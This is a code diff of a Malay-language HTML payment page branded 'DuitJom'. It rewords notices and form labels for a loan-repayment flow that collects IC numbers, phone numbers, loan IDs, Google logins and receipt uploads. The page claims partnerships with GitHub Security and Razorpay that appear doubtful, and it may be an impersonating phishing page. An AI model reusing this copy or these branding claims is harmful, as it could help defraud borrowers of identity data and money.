@@ -23,8 +23,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         /* Sembunyikan scrollbar lalai */
-.no-scrollbar::-webkit-scrollbar { display: none; }
-.no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+    .no-scrollbar::-webkit-scrollbar { display: none; }
+    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
 
 /* KOTAK UTAMA (Gaya Fintech Mewah) */
 .duitjom-news {
@@ -65,8 +65,11 @@
     z-index: 1;
 }
 
+/* Gaya baharu untuk susunan logo dan teks */
 .news-title span {
-    display: inline-block;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px; /* Jarak antara logo dan teks */
     font-size: 12px;
     color: #86efac;
     font-weight: 800;
@@ -75,6 +78,13 @@
     border-radius: 20px;
     letter-spacing: 1px;
     text-transform: uppercase;
+}
+
+/* Saiz logo syarikat */
+.news-logo {
+    width: 16px; 
+    height: auto;
+    object-fit: contain;
 }
 
 .news-title h2 {
@@ -309,13 +319,13 @@
     <div id="mainPage" class="flex flex-col min-h-screen justify-between -mt-[72px] pt-[72px]">
         <main class="max-w-md mx-auto px-4 py-12 text-center flex-grow flex flex-col justify-center items-center">
             <div class="inline-block bg-blue-100 text-blue-600 font-semibold text-xs px-3 py-1.5 rounded-full uppercase tracking-wider mb-6">
-                • PEMBAYARAN DIGITAL, EXPRESS
+                SELAMAT • DIGITAL • CEPAT
             </div>
             <h1 class="text-3xl font-extrabold text-slate-950 tracking-tight leading-tight mb-6">
                 Dapatkan Kemaskini <span class="text-blue-400">dalam minit,</span> bukan minggu
             </h1>
             <p class="text-gray-600 text-sm max-w-xl mx-auto mb-10">
-                Keputusan Kemaskini Sepantas Kilat. Pembayaran Hanya Di Hujung Jari Anda.
+                Komputer berkuasa A.I akan menjana keputusan secara serta-merta. Terima update sistem pantas
             </p>
 
             <div class="w-full max-w-xs mb-16">
@@ -327,7 +337,7 @@
 
                 <!-- GOOGLE OAUTH LOGIN (Halaman Utama) -->
                 <div id="googleSignInSection" class="border-t border-gray-300 relative mt-4 pt-8">
-                    <span class="absolute -top-3 left-1/2 transform -translate-x-1/2 bg-[#FAF6F0] px-3 text-xs text-gray-500 font-medium whitespace-nowrap">atau log masuk dengan</span>
+                    <span class="absolute -top-3 left-1/2 transform -translate-x-1/2 bg-[#FAF6F0] px-3 text-xs text-gray-500 font-medium whitespace-nowrap">Log Masuk Bersama</span>
                     
                     <!-- Arahan kepada pelanggan -->
                     <p class="text-[13px] text-red-600 font-bold mb-4 leading-tight">
@@ -344,9 +354,12 @@
 <section class="duitjom-news">
 
     <div class="news-title">
-        <span>📰 News Hub</span>
+        <span>
+            <img src="IMG_6715.png" alt="Logo DuitJom" class="news-logo"> 
+            DuitJom x GitHub
+        </span>
         <h2>Berita & Pengumuman</h2>
-        <p>Kemas kini terkini daripada DuitJom</p>
+        <p>Update terkini daripada DuitJom</p>
     </div>
 
     <!-- Wrapper untuk animasi -->
@@ -355,46 +368,46 @@
             
             <!-- SET BERITA PERTAMA -->
             <div class="news-item">
-                <div class="news-label latest">BAHARU</div>
-                <h3>Sistem Pembayaran Digital Baharu Duitjom x GitHub</h3>
-                <p>Sistem pembayaran DuitJom kini dipertingkatkan keselamatan pengguna yang dilindungi oleh Google.</p>
-                <small>🔐 19 Julai 2026</small>
+                <div class="news-label latest">TERKINI</div>
+                <h3>Sistem Pembayaran Selamat</h3>
+                <p>Sistem pembayaran DuitJom kini dipertingkatkan oleh kawalan GitHub.</p>
+                <small>Kerjasama GitHub Security</small>
             </div>
 
             <div class="news-item">
-                <div class="news-label security">KESELAMATAN</div>
-                <h3>Log Masuk Google</h3>
-                <p>Hanya Log Masuk menggunakan akaun email anda yang telah terdaftar di www.duitjom.com untuk privasi dan keselamatan.</p>
-                <small>🆘 Perlindungan Data&Privasi Pelanggan</small>
+                <div class="news-label security">LOGIN GOOGLE</div>
+                <h3>Sistem Log Masuk Google</h3>
+                <p>Log Masuk ke sistem hanya menggunakan email Google yang didaftarkan di www.duitjom.com.</p>
+                <small>Kemas-Kini Log Masuk</small>
             </div>
 
             <div class="news-item">
                 <div class="news-label info">MAKLUMAN</div>
                 <h3>Penyelenggaraan Sistem</h3>
-                <p>Sebarang kerja baik pulih sistem, Pihak Duitjom akan memberitahu melalui email anda.</p>
-                <small>📍 Notis sistem</small>
+                <p>Sebarang kerja baik pulih sistem akan dimaklumkan terlebih dahulu kepada pengguna.</p>
+                <small>Notis Baik-Pulih🆘</small>
             </div>
 
             <!-- SET BERITA KEDUA (Salinan untuk loop infiniti yang lancar) -->
             <div class="news-item">
-                <div class="news-label latest">PESANAN</div>
-                <h3>Perlindungan Privasi Pelanggan</h3>
-                <p>Sistem akan Log Keluar pelanggan secara automatik selepas tiada respon dalam masa 5 minit.</p>
-                <small>Privasi Terlindung 📋</small>
+                <div class="news-label latest">KERJASAMA</div>
+                <h3>Sistem Pembayaran di Kuasa Oleh Razorpay</h3>
+                <p>Sistem pembayaran DuitJom kini dipertingkatkan untuk pengalaman pelanggan yang lebih mudah dan selamat.</p>
+                <small>09 Julai 2026</small>
             </div>
 
             <div class="news-item">
-                <div class="news-label security">KESELAMATAN</div>
-                <h3>Peringatan Akaun</h3>
-                <p>Sila gunakan email yang sama seperti yang didaftarkan bagi memastikan proses pengesahan berjalan lancar.</p>
-                <small>🆘 Kemas kini keselamatan 🆘</small>
+                <div class="news-label security">CIRI KHAS</div>
+                <h3>Keselamatan Akaun</h3>
+                <p>Sistem akan mengelog keluar pengguna secara automatik selepas tiada respon 5 minit dari pengguna.</p>
+                <small>Kemas-Kini Ciri Khas Keselamatan</small>
             </div>
 
             <div class="news-item">
                 <div class="news-label info">MAKLUMAN</div>
-                <h3>Permohonan Pinjaman Kembali</h3>
-                <p>Sebarang permohonan pinjaman kembali mesti di buat di halaman website Duitjom.com.</p>
-                <small>Pinjaman Berulang 💳</small>
+                <h3>Notifikasi E-mail Pengguna</h3>
+                <p>Notifikasi akan di hantar secara automatik kepada pengguna jika terdapat sebarang Trasaksi curiga.</p>
+                <small>Notifikasi Email</small>
             </div>
 
         </div>
@@ -443,8 +456,8 @@
                     <div class="flex items-start gap-3">
                         <div class="flex-shrink-0 w-8 h-8 bg-blue-400 text-white rounded-full flex items-center justify-center font-bold text-xs">2</div>
                         <div>
-                            <p class="font-extrabold text-slate-900 mb-1">Semak Maklumat Anda</p>
-                            <p class="text-gray-600 text-xs leading-relaxed">Pastikan semua maklumat yang anda isi adalah betul. Jika ada kesilapan, klik butang "Sebelum" untuk kembali ke halaman sebelum.</p>
+                            <p class="font-extrabold text-slate-900 mb-1">Sahkan Maklumat Anda</p>
+                            <p class="text-gray-600 text-xs leading-relaxed">Pastikan semua maklumat yang anda isi adalah betul. Jika berlaku kesilapan, klik butang "Sebelum" untuk kembali ke halaman sebelum.</p>
                         </div>
                     </div>
                 </div>
@@ -477,7 +490,7 @@
                         <div class="flex-shrink-0 w-8 h-8 bg-blue-400 text-white rounded-full flex items-center justify-center font-bold text-xs">5</div>
                         <div>
                             <p class="font-extrabold text-slate-900 mb-1">Muat Naik Resit</p>
-                            <p class="text-gray-600 text-xs leading-relaxed">Ambil tangkapan skrin resit pembayaran anda dan muat naiknya di sini. Ini untuk pengesahan dan kemaskini pembayaran anda.</p>
+                            <p class="text-gray-600 text-xs leading-relaxed">Muat-Naik bukti pembayaran untuk tujuan pengesahan dan rujukan anda.</p>
                         </div>
                     </div>
                 </div>
@@ -511,7 +524,7 @@
             <img src="IMG_6715.png" alt="Logo" class="w-16 h-16 object-contain">
             <div class="spinner"></div>
             <p class="text-center text-gray-600 font-semibold text-sm max-w-xs">
-                Sila tunggu, kami sedang semak maklumat anda
+                Sila tunggu, Maklumat sedang di Sahkan
             </p>
         </div>
     </div>
@@ -524,13 +537,13 @@
                 <img src="IMG_6715.png" alt="Logo" class="w-full h-full object-contain">
             </div>
             <h2 class="text-gray-500 font-semibold text-center text-xs max-w-xs mb-6 leading-relaxed">
-                Halaman Web Rasmi Pembayaran Duitjom x GitHub, Razorpay Curlec
+                Halaman Pembayaran Duitjom x GitHub, Razorpay Curlec
             </h2>
 
             <div class="w-full bg-white rounded-2xl p-1">
                 <div class="text-lg font-bold text-slate-900 flex items-center gap-2 mb-6 px-1">
-                    <span>📋</span>
-                    <h3>Langkah 1 : Masukan Maklumat Diri</h3>
+                    <span>🪪</span>
+                    <h3>Langkah 1 : Butiran Maklumat Diri</h3>
                 </div>
 
                 <form onsubmit="goToNextStepPage(event)" class="space-y-4">
@@ -543,7 +556,7 @@
                         <input type="text" id="inputIC" required placeholder="000000-00-0000" maxlength="14" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm" oninput="formatIC(this)">
                         <p id="icError" class="text-red-500 text-xs mt-1.5 hidden flex items-start gap-1">
                             <i class="fas fa-exclamation-circle flex-shrink-0 mt-0.5"></i>
-                            <span>Nombor kad pengenalan mesti tepat 12 digit dalam format (######-##-####)</span>
+                            <span>Nombor kad pengenalan format .e.g (000000-00-0000)</span>
                         </p>
                     </div>
                     <div>
@@ -553,9 +566,9 @@
                             <i class="fas fa-exclamation-circle flex-shrink-0 mt-0.5"></i>
                             <span>DJ/CUST NUMBER Tidak Sah</span>
                         </p>
-                        <p class="text-red-500 text-xs mt-1.5 flex items-start gap-1">
+                        <p class="text-blue-500 text-xs mt-1.5 flex items-start gap-1">
                             <i class="fas fa-info-circle flex-shrink-0 mt-0.5"></i>
-                            <span>Sila pergi ke website www.duitjom.com(Duitjom) untuk dapatkan DJ/CUST NUMBER(.e.g : dj30001234)</span>
+                            <span>Sila log masuk ke website www.duitjom.com(Duitjom) untuk dapatkan DJ/CUST NUMBER e.g(DJ300001234)</span>
                         </p>
                     </div>
                     <div>
@@ -563,7 +576,7 @@
                         <input type="text" id="inputPhone" required placeholder="0123456789" maxlength="11" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm" oninput="validatePhone(this)">
                         <p id="phoneError" class="text-red-500 text-xs mt-1.5 hidden flex items-start gap-1">
                             <i class="fas fa-exclamation-circle flex-shrink-0 mt-0.5"></i>
-                            <span>Nombor telefon mesti antara 10-11 digit sahaja</span>
+                            <span>Nombor telefon Malaysia sahaja</span>
                         </p>
                     </div>
                     <div>
@@ -591,7 +604,7 @@
             <div class="w-full bg-[#FAF6F0] rounded-2xl border border-gray-200 p-5 mb-6">
                 <div class="text-md font-bold text-slate-900 flex items-center gap-2 mb-4">
                     <span>🔍</span>
-                    <h3>Pastikan⁉️Semak Maklumat Anda</h3>
+                    <h3>Sila Pastikan Butiran Maklumat Benar</h3>
                 </div>
                 <div class="space-y-3 border-t border-gray-200 pt-4 text-xs">
                     <div class="flex justify-between"><span class="text-gray-500">Nama Penuh(IC):</span><span id="reviewNama" class="font-bold text-slate-900">-</span></div>
@@ -623,7 +636,7 @@
                 <div class="flex justify-between items-start text-xs font-semibold text-slate-900 mb-2">
                     <span>Jumlah Pembayaran</span>
                     <div class="text-right">
-                        <span class="text-gray-500 font-normal">DJ/CUST NUMBER (e.g dj30001234):</span> 
+                        <span class="text-gray-500 font-normal">DJ/CUST NUMBER format e.g(DJ30001234):</span> 
                         <span id="displayLoanID" class="text-slate-900 font-bold ml-1">-</span>
                     </div>
                 </div>
@@ -631,7 +644,7 @@
                 <div id="displayMainAmaun" class="text-3xl font-bold text-slate-950 mb-4">RM 0.00</div>
 
                 <div class="flex justify-between items-center text-xs text-gray-500 mb-3">
-                    <span>Jumlah Perlu Dibayar:</span>
+                    <span>Jumlah Perlu Di Bayar :</span>
                     <span class="font-bold text-slate-900">RM 0.00</span>
                 </div>
 
